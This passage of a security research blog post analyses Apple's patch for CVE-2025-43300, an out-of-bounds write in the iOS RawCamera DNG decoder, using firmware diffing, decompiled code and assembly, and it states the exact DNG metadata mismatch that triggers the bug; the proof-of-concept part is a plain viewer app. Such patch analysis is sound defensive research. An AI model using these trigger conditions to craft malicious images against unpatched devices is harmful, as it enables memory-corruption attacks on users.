__AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ _kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>Since the diff does not show code-level changes, we moved to <strong>IDA Pro</strong> for deeper inspection.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image4.png" alt="image.png"></p><p>We used <strong>ipsw</strong> to download both 18.6.1 and 18.6.2 firmwares.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image7.png" alt="image.png"></p><p>The <code>dyld_shared_cache</code> is a cache file that bundles frequently used system libraries and frameworks together for faster loading during iOS/macOS boot. It contains optimized versions of <code>.dylibs</code> and frameworks, allowing faster app startup and reduced memory usage.<br>Since the actual system loads these cached binaries, we can extract RawCamera directly from the cache for comparison and analysis.</p><p>Although it can also be extracted using <code>ipsw dyld extract</code>, in this research, we analyzed it</p><p>directly by loading <code>dyld_shared_cache</code> in IDA.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image8.png" alt="image.png"></p><p>The binary was exported in <strong>BinExport</strong> format for diffing.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image9.png" alt="image.png"></p><p>Due to limited space, we referred to public analysis from Quarkslab<br>: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>Out of six modified functions, two &#x2014; <code>sub_1DD8A7684</code> and <code>sub_1DD95DC1C</code> &#x2014; were significantly changed. We focused our analysis on these two.</p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image11.png" alt="image.png"></p><p>We loaded <code>dyld_shared_cache</code> extracted from ipsw for analysis:<br><em>&#x2192; Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em></p><p><img src="/2025/10/23/clalxk/imageIO_en/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image13.png" alt="image.png"></p><p>A new <strong>pixel buffer size verification step</strong> was added.</p><p>See the following section for detailed code comparison.</p><h3 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a><strong>Code Analysis</strong></h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: legacy CGImage path</span></span><span class="hljs-function"></span>{    v13 = CGImageSourceCreateWithData(...);    ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    BytesPerRow = CGImageGetBytesPerRow(ImageAtIndex);    <span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: new CMPhoto + CVPixelBuffer path</span></span><span class="hljs-function"></span>{    CMPhotoDecompressionSessionCreate(...);    CMPhotoDecompressionContainerCreateImageForIndex(...);    BytesPerRow = CVPixelBufferGetBytesPerRow(buf);    DataSize = CVPixelBufferGetDataSize(buf);    <span class="hljs-keyword">if</span> (DataSize != expected)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><h3 id="Key-Differences"><a href="#Key-Differences" class="headerlink" title="Key Differences"></a>Key Differences</h3><ol><li><p><strong>CGImage &#x2192; CMPhoto + CVPixelBuffer</strong></p><ul><li><p><strong>G90 (18.6.1):</strong></p><p>  Uses CoreGraphics pipeline (<code>CGImageSourceCreateImageAtIndex</code> + <code>CGDataProviderCopyData</code>)</p><p>  and directly iterates raw <code>CFData</code> bytes.</p></li><li><p><strong>G100 (18.6.2):</strong></p><p>  Introduces <strong>CMPhoto</strong> decompression pipeline:</p><p>  <code>CMPhotoDecompressionSessionCreate &#x2192; CMPhotoDecompressionContainerCreateImageForIndex</code> &#x2192; <code>CVPixelBuffer</code>.</p><p>  Accesses pixels through <strong>CVPixelBufferLockBaseAddress()</strong>, ensuring safer memory handling.</p></li></ul></li><li><p><strong>Buffer Size Validation Added</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li><p><strong>Before:</strong> Only checked <code>CFDataGetLength() == 4 * width * height</code>.</p><p>  This ignored row padding (<code>bytesPerRow</code>) and format variations.</p></li></ul></li></ol><pre><code><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre>- **After:** Validates using `CVPixelBufferGetDataSize()` against an internally computed expected value (considering stride).    &#x2192; Prevents overrun caused by underestimated buffer size.</code></pre><ol><li><strong>Pixel Channel Order</strong><ul><li><strong>Old:</strong> Assumed RGB order, manual pointer increments.</li><li><strong>New:</strong> Explicitly treats buffer as BGRA, reading channels in fixed offsets (B&#x2192;G&#x2192;R).</li></ul></li></ol><hr><p><strong>Summary:</strong></p><p>The patch migrated from <strong>CoreGraphics raw byte decoding</strong> to a <strong>CoreMedia Photo pipeline</strong></p><p>and added <strong>explicit data size/stride checks</strong>, eliminating unbounded writes from mismatched DNG metadata.</p><p>Through the analysis of the modified code, we were able to understand the general behavior of the function.</p><p>In summary, <strong>G90 (iOS 18.6.1)</strong> decodes the image through the <strong>CGImage</strong> path and directly iterates over the <strong>CFData</strong> buffer. The verification process only checks two things &#x2014; the <strong>match of width and height</strong>, and whether <strong>CFDataGetLength() == 4 &#xD7; W &#xD7; H</strong> &#x2014; while actual memory access is performed using a <strong>row-based offset (</strong><code>BytesPerRow</code><strong>)</strong>. Because of this, for certain images (depending on color space, subsampling, or row padding), the validation may <strong>pass successfully, but the actual access can exceed the bounds of CFData</strong>.</p><p>In contrast, <strong>G100 (iOS 18.6.2)</strong> fixes this issue by switching the decoding pipeline from <strong>CGImage &#x2192; CMPhoto (JFIF only) &#x2192; CVPixelBuffer</strong>, and comparing the <strong>actual total buffer size (</strong><code>CVPixelBufferGetDataSize</code><strong>)</strong> against an <strong>expected value</strong> computed internally based on width, height, and other parameters.</p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(Analyzed based on the G90 version)</p><p>During analysis, we observed that <code>sub_1DD8A7684</code> makes a function call through a <strong>vtable</strong>.</p><p>In C++, every object typically begins with a <strong>vptr (virtual table pointer)</strong>.</p><p>Virtual function calls are made at runtime through that pointer &#x2014; something like <code>this-&gt;vptr[slot]</code>.</p><p>However, since the RawCamera binary is <strong>fully stripped</strong>, only addresses are visible,</p><p>making direct analysis difficult.</p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>which conceptually means:</p><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>To make it more readable and traceable, I defined the vtable as a structure (class) in IDA using an IDAPython script.</p><p>The script did the following:</p><ol><li>Parse the vtable and create a corresponding struct.</li><li>Apply <code>struct CDNGLosslessJpegUnpacker *this</code> as the first parameter for all virtual functions.</li></ol><p>Once this is done, the call expression <code>(*(*this)+0xE0)(this)</code> appears as <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code>, and fields like <code>this-&gt;field_d8</code> become explicit &#x2014; making slot mapping and call tracing much easier.</p><p>Now, let&#x2019;s identify where the vulnerable function is actually invoked in the call tree.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image14.png" alt="image.png"></p><p>Filtering for &#x201C;Lossless&#x201D; quickly reveals the target class</p><p><code>CDNGLosslessJpegUnpacker</code>.</p><p>Following the references leads to the function <code>sub_1DD95DE88</code>.</p><p><strong>Detailed Code (sub_1DD95DE88)</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p>The function performs <strong>three checks</strong>:</p><ol><li><code>[this+0xD8] != 0</code></li><li><code>vtable[28](this) == 2</code></li><li><code>[this+0xF0] - [this+0xE8] == 4</code></li></ol><p>If <strong>any</strong> of these conditions is true, it calls <code>sub_1DD9009D4()</code> and <strong>exits safely</strong>.</p><p>Otherwise, it proceeds to the <strong>&#x201C;Tile Queue&#x201D;</strong> path &#x2014; which includes the vulnerable function chain.</p><pre><code class="hljs c">; Check <span class="hljs-number">1</span>LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]CBNZ  W8, loc_1DD95DF78; Check <span class="hljs-number">2</span>LDR   X16, [X23]AUTDA X16, X17LDR   X8, [X16,#<span class="hljs-number">0xE0</span>]!  ; vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] -&gt; slot <span class="hljs-number">28</span>MOV   X0, X23BLRAA X8, X17CMP   W0, #<span class="hljs-number">2</span>BEQ   loc_1DD95DF78; Check <span class="hljs-number">3</span>LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]SUB   X8, X8, X9CMP   X8, #<span class="hljs-number">4</span>B.NE  loc_1DD95E008</code></pre><p>If none of the above branches are taken, the function reaches a section where a dispatch queue named <code>&quot;Lossless DNG Tile Unpacker Queue&quot;</code> is created &#x2014; this is the path that eventually leads to the vulnerable unpacking logic.</p><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88 simplified</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span>){    sub_1DD9009D4(...); <span class="hljs-comment">// safe path</span>} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// Vulnerable path</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; sub_1DD95E4A4 <span class="hljs-keyword">or</span> sub_1DD95B198    &#x2192; sub_1DD95EA64 &#x2192; sub_1DDA4EF58}</code></pre><p>Thus, when all three conditions fail,<br>the code spawns a tile-based decompression queue that ultimately triggers the vulnerable unpack routine.</p><h3 id="What-is-the-Tile-Queue"><a href="#What-is-the-Tile-Queue" class="headerlink" title="What is the Tile Queue?"></a>What is the Tile Queue?</h3><p>The <strong>tile queue</strong> splits a large image into small rectangular <strong>tiles</strong> (TileWidth &#xD7; TileLength).</p><p>Each tile is decoded, color-corrected, and placed in the output buffer.</p><p>The vulnerable path processes each tile independently but assumes metadata consistency between <strong>SamplesPerPixel</strong> and <strong>NumComponents</strong> &#x2014; which, when mismatched, causes a buffer overflow.</p><p><strong>Simplified Call Tree</strong></p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><hr><p><img src="/2025/10/23/clalxk/imageIO_en/image15.png" alt="image.png"></p><p>Boom &#x1F4A5; &#x2014; and with a clearer head, let&#x2019;s continue &gt;&lt;</p><hr><p>Before diving into the PoC,</p><p>let&#x2019;s briefly recap the <strong>background concepts</strong> necessary to understand this behavior.</p><hr><h2 id="Background-Concepts"><a href="#Background-Concepts" class="headerlink" title="Background Concepts"></a>Background Concepts</h2><h3 id="1-Pixels-Channels-Samples-and-Bit-Depth"><a href="#1-Pixels-Channels-Samples-and-Bit-Depth" class="headerlink" title="1. Pixels, Channels (Samples), and Bit Depth"></a>1. Pixels, Channels (Samples), and Bit Depth</h3><ul><li><strong>Pixel</strong>: The smallest visual unit of an image.</li><li><p><strong>Channel (Sample)</strong>: A single numeric component representing one aspect of a pixel (R, G, B, etc.).</p><p>  &#x2192; <code>SamplesPerPixel</code> = number of channels per pixel</p><p>  &#x2192; <code>BitsPerSample</code> = number of bits used to represent each channel</p></li></ul><p>Examples:</p><div class="table-container"><table><thead><tr><th>Type</th><th>SamplesPerPixel</th><th>BitsPerSample</th><th>Bytes per Pixel</th></tr></thead><tbody><tr><td>Grayscale</td><td>1</td><td>8</td><td>1</td></tr><tr><td>RGB 8bpc</td><td>3</td><td>8</td><td>3</td></tr><tr><td>RGBA 16bpc</td><td>4</td><td>16</td><td>8</td></tr></tbody></table></div><p>These metadata values determine <strong>buffer size</strong>, <strong>stride (bytes per row)</strong>, and <strong>loop boundaries</strong> in decompression.</p><h3 id="2-DNG"><a href="#2-DNG" class="headerlink" title="2. DNG"></a>2. DNG</h3><p>DNG (Digital Negative) is <strong>Adobe&#x2019;s RAW image container format</strong>, built upon <strong>TIFF/EP</strong> structure.</p><p>It stores raw sensor data (e.g., Bayer CFA), thumbnails, and color correction metadata.</p><p>Key tags:</p><ul><li><strong>RowsPerStrip / TileWidth / TileLength</strong></li><li><strong>StripOffsets / TileOffsets</strong></li><li><strong>StripByteCounts / TileByteCounts</strong></li><li><strong>SamplesPerPixel / BitsPerSample</strong></li></ul><p>The decoder uses these values to calculate</p><p><strong>buffer offsets</strong>, <strong>BytesPerRow</strong>, and <strong>total data size</strong> for writing.</p><h3 id="3-RAW-and-Compression"><a href="#3-RAW-and-Compression" class="headerlink" title="3. RAW and Compression"></a>3. RAW and Compression</h3><p>RAW data is unprocessed, high bit-depth sensor output (e.g., 12/14/16 bits per pixel, typically 1 sample per pixel).</p><p>To save space, DNG supports <strong>lossless compression</strong>, most notably <strong>JPEG Lossless (SOF3)</strong>.</p><ul><li>Compression = 1 &#x2192; Uncompressed</li><li>Compression = 7 &#x2192; JPEG (Baseline or Lossless)</li><li>Compression = 8 &#x2192; Deflate (ZIP)</li><li>Compression = 34892 &#x2192; JPEG Baseline (Lossy)</li></ul><p>&#x2705; The vulnerability resides in the <strong>Lossless JPEG (SOF3)</strong> decoding path.</p><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image16.png" alt="image.png"></p><p>Normal DNG files typically <strong>do not</strong> reach the vulnerable path.</p><p>However, by tweaking metadata tags (for example, <code>SamplesPerPixel</code>) so that the initial checks pass, we can force the code path to invoke the vulnerable function.</p><p>I ran this on my phone without updating it (because I had no space &#x1F602;).</p><p><img src="/2025/10/23/clalxk/imageIO_en/image17.png" alt="image.png"></p><p>My device is on <strong>iOS 18.1.1</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image18.png" alt="image.png"></p><p>Using the small DNG viewer app above, I loaded the PoC DNG and observed the following:</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_en/image19.png" alt="image.png"></p><p>Here is the image that was used.</p><p>Using this viewer to load the PoC DNG file, I observed the following details:</p><ul><li><code>CLosslessJpegUnpacker</code> at <code>0x1DD902E78</code></li><li><code>CDNGLosslessJpegUnpacker</code> at <code>0x1DD95DE88</code></li><li><code>CDNGLosslessJpegUnpacker::unpackTile</code> at <code>0x1DD95B198</code></li><li><code>CLosslessJpegRestartUnpacker</code> at <code>0x1DD95F784</code></li></ul><p><strong>Trigger conditions:</strong></p><ul><li>JPEG marker: <strong>SOF3 (Lossless JPEG)</strong> present</li><li>DHT (Define Huffman Table(s)) present</li><li>SOS (Start Of Scan) valid</li><li><strong>BitsPerSample = 16</strong></li><li><strong>SamplesPerPixel = 2</strong> (TIFF tag)</li><li><strong>NumComponents = 1</strong> (SOF3/JPEG stream)</li></ul><p>The root cause is a mismatch between how the loop termination condition is computed versus how the inner loop performs writes:</p><p><img src="/2025/10/23/clalxk/imageIO_en/image20.png" alt="image.png"></p><ul><li>The outer pixel loop is bounded by <strong>NumComponents</strong> = 1 (so it expects one component per pixel),</li><li>but the inner write routine assumes <strong>SamplesPerPixel</strong> = 2 and writes <strong>two 16-bit samples per pixel</strong>, advancing the destination pointer as if there are two samples per pixel.</li></ul><p>As a result, each row ends up writing <strong>twice</strong> the expected number of bytes &#x2192; <strong>out-of-bounds writes</strong> occur at the row boundary.</p><p>Following the flow, you can trace the chain like:</p><pre><code class="hljs apache"><span class="hljs-attribute">0x1DD95B198</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">6</span>C<span class="hljs-number">4</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">8</span>DC &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">944</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>BCCC</code></pre><p>(Trace through these offsets to map how the pixel decoder iterates and performs the writes.)</p><p><img src="/2025/10/23/clalxk/imageIO_en/image21.png" alt="image.png"></p><p>The sample image I used is from DPReview:</p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>(Used that image as a starting point to craft a DNG variant for the PoC.)</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, <strong>CVE-2025-43300</strong> is an OOB Write caused by a mismatch between TIFF metadata and the internal JPEG Lossless stream:</p><ul><li><code>SamplesPerPixel = 2</code> (DNG tag) but <code>NumComponents = 1</code> (SOF3 stream)</li><li>Loop termination is computed against <strong>components(=1)</strong> but the inner write loop writes <strong>16-bit &#xD7; 2 samples per pixel</strong>, causing <strong>double writes per row</strong> &#x2192; <strong>OOB write</strong>.</li></ul><p>Using <code>dyld_shared_cache</code> diffs and vtable typeing, I traced the vulnerable path to the <strong>CDNGLosslessJpegUnpacker &#x2192; Tile Unpacker</strong> and identified the exact trigger conditions and dataflow.</p><p>Apple patched the issue in <strong>iOS 18.6.2</strong> by:</p><ol><li>Switching from the fragile <code>CGImage</code> + <code>CFData</code> raw traversal pipeline to a <strong>CMPhoto &#x2192; CVPixelBuffer</strong> pipeline (more robust, standardized pixel buffer APIs).</li><li>Adding explicit <strong>data size / stride validation</strong> (compare <code>CVPixelBufferGetDataSize()</code> to an internally computed expected value that takes stride into account).</li><li>Changing pixel access order/assumptions to match the actual buffer layout.</li></ol><p>If you are on a real device, update to <strong>iOS 18.6.2 or later</strong> &#x2014; the patched code prevents attempts to reach this unsafe write path. (I should update mine too &#x2014; I&#x2019;ll do that soon &#x1F602;)</p><p>That wraps up this short research note &#x2014; the path was a fun exercise in dyld cache extraction, vtable reconstruction, and low-level 